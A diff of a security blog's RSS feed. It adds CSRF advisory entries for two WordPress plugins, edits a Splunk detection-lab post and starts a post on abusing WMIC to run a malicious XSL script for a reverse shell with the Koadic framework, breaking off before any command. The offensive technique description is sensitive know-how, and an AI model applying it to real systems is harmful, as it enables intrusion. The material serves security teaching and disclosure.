+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Caret Country Access Limit Plugin &amp;lt;= 1.0.2 is vulnerable to Cross Site Request Forgery (CSRF)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.0.2&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Request Forgery:&lt;/strong&gt; Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Caret Country Access Limit&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.0.2&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;1.0.3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A5: Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Request Forgery (CSRF)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-45641&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-45641&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;eb3f86ef6148&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;12 Oct, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;25 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-45642</title>
+      <link>http://localhost:1313/docs/07_research/01-cve-2023-45642/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/01-cve-2023-45642/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Request Forgery (CSRF)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-request-forgery-csrf&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-request-forgery-csrf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Snap Pixel Plugin &amp;lt;= 1.5.8 is vulnerable to Cross Site Request Forgery (CSRF)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;=15.8&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Request Forgery:&lt;/strong&gt; Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Snap Pixel&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.5.8&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;1.6.0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A5: Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Request Forgery (CSRF)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-45642&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-45642&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;710c94b96abe&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;12 Oct, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;20 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
     
     <item>
       <title>Lab Development</title>
@@ -106,7 +2496,7 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Once the installation is completed. login to the Ubuntu Server
-![[Pasted image 20261102141258.png]]&lt;/p&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102141258.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Next we will set up the Ubuntu server with the nexessary tools.&lt;/p&gt;
@@ -165,7 +2555,7 @@
 &lt;/div&gt;
 &lt;ul&gt;
 &lt;li&gt;Once done, our directory structure should look the below;
-![[Pasted image 20261102145540.png]]&lt;/li&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102145540.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h4&gt;02 Setting up SIEM&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;02-setting-up-siem&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#02-setting-up-siem&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
@@ -409,9 +2799,9 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;/div&gt;
 &lt;ul&gt;
 &lt;li&gt;Next login to the Splunk instance using the credentials &lt;code&gt;hunter:hunter123&lt;/code&gt;
-![[Pasted image 20261102152122.png]]&lt;/li&gt;
+&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102152122.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;![[Pasted image 20261102152140.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102152140.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;h4&gt;02 Target Architecture&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;02-target-architecture&#34;&gt;&lt;/span&gt;
     &lt;a href=&#34;#02-target-architecture&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/05_detection/5.1_labs/assets/Pasted_image_20261102130458.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 
@@ -513,111 +2903,6 @@ free -h&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 			&lt;/tr&gt;
 	&lt;/tbody&gt;
 &lt;/table&gt;
-
-      </description>
-    </item>
-    
-    <item>
-      <title>Workshop Overview</title>
-      <link>http://localhost:1313/docs/07_research/01-cve/</link>
-      <pubDate>Mon, 02 Nov 2026 00:00:00 +0000</pubDate>
-      
-      <guid>http://localhost:1313/docs/07_research/01-cve/</guid>
-      <description>
-        
-        
-        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
-  
-    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
-      By:
-      
-        
-        
-        
-        
-          
-          
-          
-            
-          
-          
-          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
-            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
-                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
-            &lt;/svg&gt;
-            Prasanna
-          &lt;/a&gt;
-        
-      
-    &lt;/span&gt;
-  
-
-  
-    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
-    &lt;time style=&#34;font-style: italic;&#34;&gt;November 2, 2026&lt;/time&gt;
-  
-&lt;/div&gt;
-&lt;h4&gt;WordPress Snap Pixel Plugin &amp;lt;= 1.5.8 is vulnerable to Cross Site Request Forgery (CSRF)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;wordpress-snap-pixel-plugin--158-is-vulnerable-to-cross-site-request-forgery-csrf&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#wordpress-snap-pixel-plugin--158-is-vulnerable-to-cross-site-request-forgery-csrf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Low priorityNo impactful threat&lt;/p&gt;
-&lt;p&gt;&amp;lt;= 1.5.8Vulnerable version(s)&lt;/p&gt;
-&lt;p&gt;&lt;a
-    href=&#34;https://patchstack.com/database/wordpress/plugin/snap-pixel/vulnerabilities&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WordPress Plugin&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a
-    href=&#34;https://patchstack.com/for-plugins/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;No VDP&lt;/a&gt;&lt;/p&gt;
-&lt;h4&gt;Risks&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;risks&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#risks&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;CVSS 5.4&lt;/p&gt;
-&lt;p&gt;As immediate action, update the affected plugin. If you&amp;rsquo;re unable to do so, ask your hosting provider or web developer for help.&lt;/p&gt;
-&lt;h4&gt;User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;user-interaction-required&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
-&lt;h5&gt;5.4&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;54&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#54&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;h3&gt;Cross Site Request Forgery (CSRF)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;cross-site-request-forgery-csrf&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#cross-site-request-forgery-csrf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/p&gt;
-&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
-&lt;h1&gt;Solutions&lt;/h1&gt;&lt;p&gt;This security issue has a low severity impact and is unlikely to be exploited.&lt;/p&gt;
-&lt;h4&gt;Update to version 1.6.0 or later.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;update-to-version-160-or-later&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#update-to-version-160-or-later&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Update to version 1.6.0 or later to resolve the vulnerability.&lt;/p&gt;
-&lt;h1&gt;Details&lt;/h1&gt;&lt;p&gt;Software&lt;/p&gt;
-&lt;p&gt;Snap Pixel&lt;/p&gt;
-&lt;p&gt;Type&lt;/p&gt;
-&lt;p&gt;Plugin&lt;/p&gt;
-&lt;p&gt;Vulnerable versions&lt;/p&gt;
-&lt;p&gt;&amp;lt;= 1.5.8&lt;/p&gt;
-&lt;p&gt;Patched in&lt;/p&gt;
-&lt;p&gt;1.6.0&lt;/p&gt;
-&lt;p&gt;OWASP Top 10&lt;/p&gt;
-&lt;p&gt;A5: Broken Access Control&lt;/p&gt;
-&lt;p&gt;Classification&lt;/p&gt;
-&lt;p&gt;Cross Site Request Forgery (CSRF)&lt;/p&gt;
-&lt;p&gt;CVE ID&lt;/p&gt;
-&lt;p&gt;&lt;a
-    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-45642&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-45642&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Patchstack priority&lt;/p&gt;
-&lt;p&gt;Low&lt;/p&gt;
-&lt;p&gt;CVSS severity&lt;/p&gt;
-&lt;p&gt;5.4&lt;/p&gt;
-&lt;p&gt;Required privilege&lt;/p&gt;
-&lt;p&gt;Unauthenticated&lt;/p&gt;
-&lt;p&gt;Developer&lt;/p&gt;
-&lt;p&gt;&lt;a
-    href=&#34;https://patchstack.com/for-plugins&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Claim ownership&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;PSID&lt;/p&gt;
-&lt;p&gt;710c94b96abe&lt;/p&gt;
-&lt;p&gt;Credits&lt;/p&gt;
-&lt;p&gt;&lt;a
-    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Published&lt;/p&gt;
-&lt;p&gt;12 Oct, 2023&lt;/p&gt;
-&lt;p&gt;Have additional information or questions about this entry? &lt;a
-    href=&#34;mailto:triage@patchstack.com?subject=Inquiry%20about%20WordPress%20Snap%20Pixel%20plugin%20%3C=%201.5.8%20-%20Cross%20Site%20Request%20Forgery%20%5c%28CSRF%5c%29%20vulnerability&amp;amp;body=Hello%2C%20I%20am%20getting%20in%20touch%20in%20regards%20to%20the%20entry%20url&#34;&gt;Let us know.&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Go to&lt;/p&gt;
-&lt;p&gt;&lt;a
-    href=&#34;https://patchstack.com/database/wordpress/plugin/snap-pixel/vulnerabilities&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WordPress Plugin&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a
-    href=&#34;https://patchstack.com/for-plugins/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;No VDP&lt;/a&gt;&lt;/p&gt;
-&lt;h2&gt;Timeline&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;timeline&#34;&gt;&lt;/span&gt;
-    &lt;a href=&#34;#timeline&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Reported by&lt;img src=&#34;https://patchstack.com/_ipx/f_webp&amp;amp;fit_cover/images/profile-anonymous.webp&#34; alt=&#34;Profile Image&#34;  loading=&#34;lazy&#34; /&gt;&lt;a
-    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;20 Feb, 2023&lt;/p&gt;
 
       </description>
     </item>
@@ -757,6 +3042,306 @@ End Sub&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-
 &lt;li&gt;Save the document as &lt;code&gt;Macro Enabled&lt;/code&gt; and open the document to see the execution.
 &lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261026152824.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>[03] WMIC</title>
+      <link>http://localhost:1313/docs/03_techniques/03-wmic/</link>
+      <pubDate>Mon, 26 Oct 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/03_techniques/03-wmic/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;October 26, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;What is WMIC ?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;what-is-wmic-&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#what-is-wmic-&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;WMI is Windows Management Instrumentation is typically used for managing data in a windows operating system Its also highly efficient just like power shell since a user will be able to write scripts to automate tasks in a remote device. Due to this functionality its required to implement security features to prevent any unauthenticated services and operations.&lt;/p&gt;
+&lt;h4&gt;Security with WMIC:&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;security-with-wmic&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#security-with-wmic&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;WMI security focuses on protecting access to namespace data. WMI first grants access to groups of users as specified by the &lt;em&gt;WMI Control&lt;/em&gt; and DCOM settings and then providers determine if the user should have access to namespace data. Namespace security depends on standard Windows user &lt;em&gt;security identifiers (SID)&lt;/em&gt; and the &lt;em&gt;security descriptor&lt;/em&gt; for the WMI namespace. You can set namespace security by performing the following actions WMIC is capable of invoking XLS scripts, this allows an attacker to push a malicious excel script which could provide a reverse shell.&lt;/p&gt;
+&lt;p&gt;We will use kodiac to generate malicious XLS script, lets download the framework.&lt;/p&gt;
+&lt;h5&gt;STEP 1: open terminal a type the following command&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-1-open-terminal-a-type-the-following-command&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-1-open-terminal-a-type-the-following-command&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
